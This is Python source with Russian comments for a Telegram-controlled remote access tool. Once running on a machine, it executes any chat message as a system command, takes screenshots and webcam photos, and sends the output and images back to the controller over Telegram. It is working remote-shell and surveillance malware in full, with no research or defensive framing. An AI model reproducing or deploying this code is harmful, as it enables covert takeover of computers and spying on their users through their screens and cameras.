import telebot
import subprocess
import socket
import pyautogui
import cv2
import os

bot = telebot.TeleBot('') #Токен
hostname = socket.gethostname()


def use_command(command): #Выполнение команд
	output = subprocess.getoutput(command)
	return output

# Функция, обрабатывающая команду /start
@bot.message_handler(commands=["start"])
def start(m, res=False):
    bot.send_message(m.chat.id,'Машина: '+ hostname)
    bot.send_message(m.chat.id,'Используйте команды терминала')

# Получение сообщений от юзера
@bot.message_handler(content_types=["text"])
def handle_text(message):
	if message.text == "exit":#---------------------------------------------------------------------------------------
		bot.send_message(message.chat.id, "Отключение от удаленной машины")
		bot.polling()#Отключение бота 

	elif message.text.lower() == "help":
		bot.send_message(message.chat.id, "exit - Отключение от удаленной машины")
		bot.send_message(message.chat.id, "help - Помощь")
		bot.send_message(message.chat.id, "screenshot - Скриншот с экрана")
		bot.send_message(message.chat.id, "camera - Снимок с камеры")
		bot.send_message(message.chat.id, "info - Имя хоста")
		bot.send_message(message.chat.id, "Любой другой ввод - Системная команда")

	elif message.text.lower() == "screenshot":#-------------------------------------------------------------------------------
		try:
			myScreenshot = pyautogui.screenshot()
			myScreenshot.save(r'screen.png')
			bot.send_photo(message.chat.id, open('screen.png', 'rb'));
			bot.send_message(message.chat.id,"Скриншот")
			os.remove('screen.png')
		except:
			bot.send_message(message.chat.id,"Не удалось сделать скриншот")

	elif message.text.lower() == 'camera':#-----------------------------------------------------------------------------------
		try:
			cap = cv2.VideoCapture(0)
			for i in range(10):
			    cap.read()
			ret, frame = cap.read()
			cv2.imwrite('cam.png', frame)   
			cap.release()
			bot.send_photo(message.chat.id, open('cam.png', 'rb'))
			bot.send_message(message.chat.id, "Фото с камеры")
			os.remove('cam.png')
		except:
			bot.send_message(message.chat.id, "Не удалось сделать снимок с камеры")

	elif message.text.lower() == 'info':#-----------------------------------------------------------------------------------
		try:
			bot.send_message(message.chat.id,"Имя хоста: " + hostname)
		except:
			bot.send_message(message.chat.id, "Не удалось сделать определить")

	else:#------------------------------------------------------------------------------------------------------------ 		
		try: #Пытаемся выполнить ввод как системную команду
			out = use_command(message.text)
			bot.send_message(message.chat.id, out)
		except:
			bot.send_message(message.chat.id, "Не удалось выполнить данную команду")
			bot.send_message(message.chat.id, "Ошибка")

# Запускаем бота
bot.polling(none_stop=True, interval=0)